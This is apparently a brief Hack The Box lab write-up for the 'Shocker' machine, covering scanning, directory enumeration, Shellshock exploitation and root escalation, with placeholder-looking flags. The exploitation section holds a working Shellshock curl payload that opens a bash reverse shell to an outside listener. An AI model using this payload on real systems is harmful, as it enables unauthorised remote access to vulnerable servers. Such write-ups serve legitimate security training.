# HTB: Shocker

## IP: 10.10.10.56
## Difficulty: Easy
## OS: Linux

## 🔍 Recon
```bash
nmap -sC -sV -oN shocker_nmap.txt 10.10.10.56
```
- Port 80: Apache 2.4.29
- Port 2222: OpenSSH 7.4p1

## 🕸 Web Enum
```bash
gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
- Found `/cgi-bin/user.sh`

## ⚙️ Exploitation
Shellshock exploit using:
```bash
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'" http://10.10.10.56/cgi-bin/user.sh
```
- Got reverse shell as `www-data`

## ⬆️ Privilege Escalation
- Used `linpeas.sh`
- Found writable `/etc/passwd`
- Created new root user

## 🧾 Flags
- user.txt: HTB{abc123user}
- root.txt: HTB{rootflagexample}
